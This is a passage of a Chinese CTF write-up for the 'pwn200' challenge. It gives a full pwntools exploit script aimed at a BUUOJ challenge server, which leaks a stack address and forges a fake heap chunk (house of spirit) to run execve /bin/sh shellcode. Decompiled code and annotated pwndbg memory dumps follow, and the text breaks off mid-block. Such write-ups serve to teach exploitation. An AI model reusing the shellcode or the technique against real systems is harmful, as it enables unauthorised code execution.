<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn200&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">sh = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init</span>(<span class="params">leak</span>):</span></span><br><span class="line">	sh.sendafter(<span class="string">&quot;who are u?\n&quot;</span>,leak)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fake</span>(<span class="params">payload</span>):</span></span><br><span class="line">	sh.sendlineafter(<span class="string">&quot;give me your id ~~?&quot;</span>,<span class="string">&quot;31&quot;</span>)</span><br><span class="line">	sh.sendafter(<span class="string">&quot;give me money~&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">checkin</span>(<span class="params">idx,payload</span>):</span></span><br><span class="line">	sh.sendlineafter(<span class="string">&quot;your choice : &quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">	sh.sendlineafter(<span class="string">&quot;how long?\n&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">	sh.sendafter(<span class="built_in">str</span>(idx)+<span class="string">&#x27;\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">checkout</span>():</span></span><br><span class="line">	sh.sendlineafter(<span class="string">&quot;your choice : &quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>(<span class="params">ip,port,debug,mode</span>):</span></span><br><span class="line">	<span class="keyword">global</span> sh</span><br><span class="line">	<span class="keyword">if</span> debug==<span class="number">0</span>:</span><br><span class="line">		context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">pass</span></span><br><span class="line">	<span class="keyword">if</span> mode==<span class="number">0</span>:</span><br><span class="line">		sh = process(<span class="string">&quot;pwn200&quot;</span>)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		sh = remote(ip,port)</span><br><span class="line"></span><br><span class="line">	<span class="comment">#Step 1: leaking $RBP</span></span><br><span class="line">	<span class="comment">#gdb.attach(sh)</span></span><br><span class="line">	init(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x30</span>)	<span class="comment">#leak reg_RBP to caculate &amp;shellcode</span></span><br><span class="line">	<span class="comment">#start leaking</span></span><br><span class="line">	sh.recvuntil(<span class="string">&quot;a&quot;</span>*<span class="number">0x30</span>)</span><br><span class="line">	reg_RBP = u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">	success(<span class="string">&quot;RBP register ===&gt; &quot;</span>+<span class="built_in">hex</span>(reg_RBP))</span><br><span class="line"></span><br><span class="line">	<span class="comment">#Step 2: fake chunk</span></span><br><span class="line">				<span class="comment"># &quot;\x00&quot; to cut off strcpy()</span></span><br><span class="line">	shellcode = <span class="string">&quot;\x00\x31\xf6\x48\xbb\x2f\x62\x69\x6e&quot;</span></span><br><span class="line">	shellcode += <span class="string">&quot;\x2f\x2f\x73\x68\x56\x53\x54\x5f&quot;</span></span><br><span class="line">	shellcode += <span class="string">&quot;\x6a\x3b\x58\x31\xd2\x0f\x05&quot;</span></span><br><span class="line">	payload = (shellcode+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0x41</span>)).ljust(<span class="number">0x38</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">	payload = payload+p64(reg_RBP-<span class="number">0x90</span>)</span><br><span class="line">	fake(payload)</span><br><span class="line">	<span class="comment">#gdb.attach(sh)</span></span><br><span class="line">	checkout()</span><br><span class="line">	<span class="comment">#gdb.attach(sh)</span></span><br><span class="line">	checkin(<span class="number">0x30</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(reg_RBP - <span class="number">0xc0</span> + <span class="number">1</span>))</span><br><span class="line">	<span class="comment">#gdb.attach(sh)</span></span><br><span class="line">	sh.recv()</span><br><span class="line"></span><br><span class="line">	sh.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">	sh.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	main(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="string">&quot;25309&quot;</span>,<span class="number">0</span>,<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<h3 id="exp-讲解"><a href="#exp-讲解" class="headerlink" title="exp 讲解"></a>exp 讲解</h3><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><ol>
<li><p>将 shellcode.ljust(48,’a’)输入到 name 中，通过<code>off-by-one</code>漏洞打印出来 main 函数栈底，通过上面结构图能够算出 shellcode 的地址，选取一个处在 money 中的位置作为 fake_chunk</p>
</li>
<li><p>在 money 中伪造堆块 size，在 id 里面输入的是下一个堆块的 size(大小不能小于 <code>2 * SIZE_SZ</code>，同时也不能大于<code>av-&gt;system_mem</code>)，同时通过堆溢出漏洞覆盖掉 dest</p>
</li>
<li><p>free 掉刚才伪造的堆块，使其进入 fastbin</p>
</li>
<li><p>申请堆块，申请出来以后还是在老位置。</p>
</li>
<li><p>输入数据到刚申请的堆块中，覆盖掉 leave 指令，让之后的 rip 指向 shellcode，完成劫持，执行 shellcode。</p>
<blockquote>
<p>注意：<br>在执行 gdb.attach 附加调试时，会将栈的地址随机化。以下讲解的内存地址是程序直接执行时的内存地址</p>
</blockquote>
</li>
</ol>
<h4 id="程序加载及程序输入输出自动化"><a href="#程序加载及程序输入输出自动化" class="headerlink" title="程序加载及程序输入输出自动化"></a>程序加载及程序输入输出自动化</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn200&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">sh = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init</span>(<span class="params">leak</span>):</span></span><br><span class="line">	sh.sendafter(<span class="string">&quot;who are u?\n&quot;</span>,leak)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fake</span>(<span class="params">payload</span>):</span></span><br><span class="line">	sh.sendlineafter(<span class="string">&quot;give me your id ~~?&quot;</span>,<span class="string">&quot;31&quot;</span>)</span><br><span class="line">	sh.sendafter(<span class="string">&quot;give me money~&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">checkin</span>(<span class="params">idx,payload</span>):</span></span><br><span class="line">	sh.sendlineafter(<span class="string">&quot;your choice : &quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">	sh.sendlineafter(<span class="string">&quot;how long?\n&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">	sh.sendafter(<span class="built_in">str</span>(idx)+<span class="string">&#x27;\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">checkout</span>():</span></span><br><span class="line">	sh.sendlineafter(<span class="string">&quot;your choice : &quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br></pre></td></tr></table></figure>

<h4 id="泄露-sub-400A8E-的栈底"><a href="#泄露-sub-400A8E-的栈底" class="headerlink" title="泄露 sub_400A8E 的栈底"></a>泄露 sub_400A8E 的栈底</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#Step <span class="number">1</span>: leaking $RBP</span><br><span class="line"><span class="meta">#gdb.attach(sh)</span></span><br><span class="line">init(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x30</span>)	<span class="meta">#leak reg_RBP to caculate &amp;shellcode</span></span><br><span class="line"><span class="meta">#start leaking</span></span><br><span class="line">sh.recvuntil(<span class="string">&quot;a&quot;</span>*<span class="number">0x30</span>)</span><br><span class="line">reg_RBP = u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">success(<span class="string">&quot;RBP register ===&gt; &quot;</span>+hex(reg_RBP))</span><br><span class="line">   <span class="meta">#rbp=0x7fffffffdda0</span></span><br></pre></td></tr></table></figure>

<p>当执行这些代码之后，内存空间所示如下：</p>
<blockquote>
<p>以下内存是在程序正常运行时最开始 3 次输入完成之后得到的，仅供参考。<br>开始输入的内容分别为：123，456，789<br>有些地方不准确，之后会提到。</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">#发送payload之后(输入name之后),泄露rbp</span><br><span class="line">#泄露出来的值为：<span class="number">0x00007fffffffdda0</span></span><br><span class="line">pwndbg&gt;  x/<span class="number">50</span>gx <span class="number">0x7fffffffdc98</span></span><br><span class="line"><span class="number">0x7fffffffdc98</span>: <span class="number">0x0000000000400824</span>  <span class="number">0x000000000000000e</span></span><br><span class="line"><span class="number">0x7fffffffdca8</span>: <span class="number">0x0000000000000000</span>  <span class="number">0x00007fffffffdcd0</span></span><br><span class="line"><span class="number">0x7fffffffdcb8</span>: <span class="number">0x00000000004009e0</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffffffdcc8</span>: <span class="number">0x00007ffff7ffe168</span>  <span class="number">0x00007fffffffdd20</span></span><br><span class="line"><span class="number">0x7fffffffdcd8</span>: <span class="number">0x0000000000400a8c</span>  <span class="number">0</span>x????????????????</span><br><span class="line">    								<span class="meta">#buf从这里开始</span></span><br><span class="line"><span class="number">0x7fffffffdce8</span>: <span class="number">0</span>x????????????????	<span class="number">0</span>x????????????????</span><br><span class="line"><span class="number">0x7fffffffdcf8</span>: <span class="number">0x00007ffff7a43ea0</span>  <span class="number">0x0000000000000009</span></span><br><span class="line"><span class="number">0x7fffffffdd08</span>: <span class="number">0x00000000004008b5</span>  <span class="number">0x0000000000</span>??????</span><br><span class="line">    								#输入的id内容</span><br><span class="line">									#此内容所在的地址为：<span class="number">0x7fffffffdd10</span></span><br><span class="line"><span class="number">0x7fffffffdd18</span>: <span class="number">0x0000000000603010</span>  <span class="number">0x00007fffffffdd80</span></span><br><span class="line"><span class="number">0x7fffffffdd28</span>: <span class="number">0x0000000000400b34</span>  <span class="number">0x00007ffff7dd18e0</span></span><br><span class="line"><span class="number">0x7fffffffdd38</span>: <span class="number">0x00007ffff7fdc700</span>  <span class="number">0x0000000000000003</span></span><br><span class="line"><span class="number">0x7fffffffdd48</span>: <span class="number">0x00000000000001c8</span>  <span class="number">0x6161616161616161</span></span><br><span class="line">    			#输入的id大小 		 <span class="meta">#name从这里开始</span></span><br><span class="line"><span class="number">0x7fffffffdd58</span>: <span class="number">0x6161616161616161</span>  <span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x7fffffffdd68</span>: <span class="number">0x6161616161616161</span>  <span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x7fffffffdd78</span>: <span class="number">0x6161616161616161</span>  <span class="number">0x00007fffffffdda0</span></span><br><span class="line">    								<span class="meta">#printf会泄露的内容：&amp;rbp</span></span><br><span class="line"><span class="number">0x7fffffffdd88</span>: <span class="number">0x0000000000400b59</span>  <span class="number">0x00007fffffffde88</span></span><br><span class="line"><span class="number">0x7fffffffdd98</span>: <span class="number">0x0000000100000000</span>  <span class="number">0x0000000000400b60</span></span><br><span class="line">    								<span class="meta">#rbp，内容所在的地址为：0x7fffffffdda0</span></span><br><span class="line"><span class="number">0x7fffffffdda8</span>: <span class="number">0x00007ffff7a2d840</span>  <span class="number">0x0000000000000001</span></span><br><span class="line">    			#d840是main函数的返回地址</span><br><span class="line"><span class="number">0x7fffffffddb8</span>: <span class="number">0x00007fffffffde88</span>  <span class="number">0x00000001f7ffcca0</span></span><br><span class="line"><span class="number">0x7fffffffddc8</span>: <span class="number">0x0000000000400b36</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffffffddd8</span>: <span class="number">0x35e7fe72fd004534</span>  <span class="number">0x00000000004006b0</span></span><br><span class="line"><span class="number">0x7fffffffdde8</span>: <span class="number">0x00007fffffffde80</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffffffddf8</span>: <span class="number">0x0000000000000000</span>  <span class="number">0xca18010d50a04534</span></span><br><span class="line"><span class="number">0x7fffffffde08</span>: <span class="number">0xca1811b744304534</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffffffde18</span>: <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line">Pwndbg&gt;</span><br></pre></td></tr></table></figure>

<h4 id="伪造-fake-chunk"><a href="#伪造-fake-chunk" class="headerlink" title="伪造 fake_chunk"></a>伪造 fake_chunk</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">	<span class="comment">#Step 2: fake chunk</span></span><br><span class="line">	<span class="comment"># &quot;\x00&quot; to cut off strcpy()</span></span><br><span class="line">	shellcode = <span class="string">&quot;\x00\x31\xf6\x48\xbb\x2f\x62\x69\x6e&quot;</span></span><br><span class="line">	shellcode += <span class="string">&quot;\x2f\x2f\x73\x68\x56\x53\x54\x5f&quot;</span></span><br><span class="line">	shellcode += <span class="string">&quot;\x6a\x3b\x58\x31\xd2\x0f\x05&quot;</span></span><br><span class="line">	payload = (shellcode+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0x41</span>)).ljust(<span class="number">0x38</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">	payload = payload+p64(reg_RBP-<span class="number">0x90</span>)</span><br><span class="line">	fake(payload)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">def fake(payload):</span></span><br><span class="line"><span class="string">	sh.sendlineafter(&quot;give me your id ~~?&quot;,&quot;31&quot;)</span></span><br><span class="line"><span class="string">	sh.sendafter(&quot;give me money~&quot;,payload)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">#向栈中写入payload和shellcode，结果如下：</span><br><span class="line">#&amp;rbp<span class="number">-90</span>==<span class="number">0x7fffffffdd10</span></span><br><span class="line">pwndbg&gt;  x/<span class="number">50</span>gx <span class="number">0x7fffffffdc98</span></span><br><span class="line"><span class="number">0x7fffffffdc98</span>: <span class="number">0x0000000000400824</span>  <span class="number">0x000000000000000e</span></span><br><span class="line"><span class="number">0x7fffffffdca8</span>: <span class="number">0x0000000000000000</span>  <span class="number">0x00007fffffffdcd0</span></span><br><span class="line"><span class="number">0x7fffffffdcb8</span>: <span class="number">0x00000000004009e0</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffffffdcc8</span>: <span class="number">0x00007ffff7ffe168</span>  <span class="number">0x00007fffffffdd20</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="meta">#payload更改的内容：</span></span><br><span class="line"><span class="number">0x7fffffffdcd8</span>: <span class="number">0x0000000000400a8c</span>  <span class="number">0x69622fbb48f63100</span> #shellcode_start</span><br><span class="line">    								<span class="meta">#buf从这里开始</span></span><br><span class="line"><span class="number">0x7fffffffdce8</span>: <span class="number">0x54535668732f2f6e</span>	<span class="number">0x050fd231583b6a5f</span> #shellcode_end</span><br><span class="line"><span class="number">0x7fffffffdcf8</span>: <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffffffdd08</span>: <span class="number">0x0000000000000041</span>  <span class="number">0x0000000000000000</span></span><br><span class="line">    								#输入的id内容</span><br><span class="line">									#此内容所在的地址为：<span class="number">0x7fffffffdd10</span></span><br><span class="line"><span class="number">0x7fffffffdd18</span>: <span class="number">0x00007fffffffdd10</span>  <span class="number">0x00007fffffffdd80</span></span><br><span class="line">    			<span class="meta">#ptr现在被修改为指向0x00007fffffffdd10</span></span><br><span class="line">    			#也就是说堆块的地址被修改为：<span class="number">0x00007fffffffdd00</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="number">0x7fffffffdd28</span>: <span class="number">0x0000000000400b34</span>  <span class="number">0x00007ffff7dd18e0</span></span><br><span class="line"><span class="number">0x7fffffffdd38</span>: <span class="number">0x00007ffff7fdc700</span>  <span class="number">0x0000000000000003</span></span><br><span class="line"><span class="number">0x7fffffffdd48</span>: <span class="number">0x00000000000001c8</span>  <span class="number">0x6161616161616161</span></span><br><span class="line">    			#输入的id大小		 <span class="meta">#name从这里开始</span></span><br><span class="line"><span class="number">0x7fffffffdd58</span>: <span class="number">0x6161616161616161</span>  <span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x7fffffffdd68</span>: <span class="number">0x6161616161616161</span>  <span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x7fffffffdd78</span>: <span class="number">0x6161616161616161</span>  <span class="number">0x00007fffffffdda0</span></span><br><span class="line">    								<span class="meta">#printf会泄露的内容：&amp;rbp</span></span><br><span class="line"><span class="number">0x7fffffffdd88</span>: <span class="number">0x0000000000400b59</span>  <span class="number">0x00007fffffffde88</span></span><br><span class="line"><span class="number">0x7fffffffdd98</span>: <span class="number">0x0000000100000000</span>  <span class="number">0x0000000000400b60</span></span><br><span class="line">    								<span class="meta">#rbp，内容所在的地址为：0x7fffffffdda0</span></span><br><span class="line"><span class="number">0x7fffffffdda8</span>: <span class="number">0x00007ffff7a2d840</span>  <span class="number">0x0000000000000001</span></span><br><span class="line">    			#d840是main函数的返回地址</span><br><span class="line"><span class="number">0x7fffffffddb8</span>: <span class="number">0x00007fffffffde88</span>  <span class="number">0x00000001f7ffcca0</span></span><br><span class="line"><span class="number">0x7fffffffddc8</span>: <span class="number">0x0000000000400b36</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffffffddd8</span>: <span class="number">0x35e7fe72fd004534</span>  <span class="number">0x00000000004006b0</span></span><br><span class="line"><span class="number">0x7fffffffdde8</span>: <span class="number">0x00007fffffffde80</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffffffddf8</span>: <span class="number">0x0000000000000000</span>  <span class="number">0xca18010d50a04534</span></span><br><span class="line"><span class="number">0x7fffffffde08</span>: <span class="number">0xca1811b744304534</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffffffde18</span>: <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line">Pwndbg&gt;</span><br></pre></td></tr></table></figure>

<p>向栈中写入 payload 之前会进行 malloc，malloc 之后 ptr 指针指向的地址被修改为 0x7fffffffdd10，但是进行 strcpy 有\x00 截断，因此向栈中写入的 payload 并不会被破坏。</p>
<blockquote>
<p>malloc_chunk_start_addr=0x00007fffffffdd00<br>现在指针 ptr 指向：0x00007fffffffdd10</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sub_400A29</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v0; <span class="comment">// rdi</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">char</span> *dest; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  dest = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x40</span>uLL); <span class="comment">//代码已执行</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;give me money~&quot;</span>); <span class="comment">//代码已执行</span></span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x40</span>uLL); <span class="comment">//代码已执行</span></span><br><span class="line">  v0 = dest; <span class="comment">//执行此代码之后：v0==0x7fffffffdd10</span></span><br><span class="line">  <span class="built_in">strcpy</span>(dest, &amp;buf); <span class="comment">//此代码阻止写入的payload被破坏</span></span><br><span class="line">  ptr = dest; <span class="comment">//执行此代码之后：v0==0x7fffffffdd10</span></span><br><span class="line">  sub_4009C4(); <span class="comment">//调用函数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>这里注意在 house of spirit 中伪造 chunk 的条件，之后会说。</p>
</blockquote>
<h4 id="执行登出操作"><a href="#执行登出操作" class="headerlink" title="执行登出操作"></a>执行登出操作</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sub_40096D</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( ptr )  <span class="comment">//ptr现在指向0x00007fffffffdd10</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;out~&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">    ptr = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;havn&#x27;t check in&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#free指针并将指针置空之后，结果如下：</span></span><br><span class="line">#&amp;rbp<span class="number">-90</span>==<span class="number">0x7fffffffdd10</span></span><br><span class="line">pwndbg&gt;  x/<span class="number">50</span>gx <span class="number">0x7fffffffdc98</span></span><br><span 